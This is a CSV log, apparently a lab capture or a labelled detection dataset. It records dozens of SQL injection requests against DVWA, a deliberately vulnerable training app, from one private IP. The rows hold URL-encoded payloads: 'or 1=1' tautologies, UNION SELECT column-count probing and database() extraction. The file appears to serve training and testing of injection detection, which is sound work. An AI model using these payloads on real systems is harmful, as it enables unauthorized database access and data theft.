ip,url,date,sqlInjection
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1+%3D+1+--&Submit=Submit,15/May/2024:03:20:32,%27+or+1+%3D+1+--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1+%3D+1+%23&Submit=Submit,15/May/2024:03:20:34,%27+or+1+%3D+1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C2%2C3%2C4%2C5&Submit=Submit,15/May/2024:03:20:53,%27+union+select+1%2C2%2C3%2C4%2C5&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+%23&Submit=Submit,15/May/2024:03:24:58,%27+or+1%3D1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit,15/May/2024:03:25:23,%27+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit,15/May/2024:03:25:30,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5+%23&Submit=Submit,15/May/2024:03:25:34,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:37,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:43,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3+%23&Submit=Submit,15/May/2024:03:25:48,%27+union+select+1%2Cdatabase%28%29+%2C3+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:51,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%23&Submit=Submit,15/May/2024:03:25:54,%27+union+select+1%2Cdatabase%28%29+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1'%20or%201=1,15/May/2024:03:27:09,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1,15/May/2024:03:36:27,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1,15/May/2024:03:36:37,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1%20--&Submit=Submit,15/May/2024:03:36:43,'%20or%201=1%20--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+--&Submit=Submit,15/May/2024:03:36:48,%27+or+1%3D1+--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:37:14,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:37:36,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20--&Submit=Submit",15/May/2024:03:38:24,"'%20union%20select%201,%202,%203,%204%20--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:47:31,'%20union%20select%201--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205,%206--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205,%206,%207--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,15/May/2024:03:48:17,'%20union%20select%201
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202",15/May/2024:03:48:17,"'%20union%20select%201,%202"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206,%207"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:38,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:49,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20--%20&Submit=Submit,15/May/2024:03:50:11,'%20union%20select%201%20--%20&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:51:17,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:21,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:33,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1+--&Submit=Submit,15/May/2024:03:51:52,%27+OR+1%3D1+--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli_blind/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:54,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:26,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:53,%27+OR+1%3D1%23&Submit=Submit
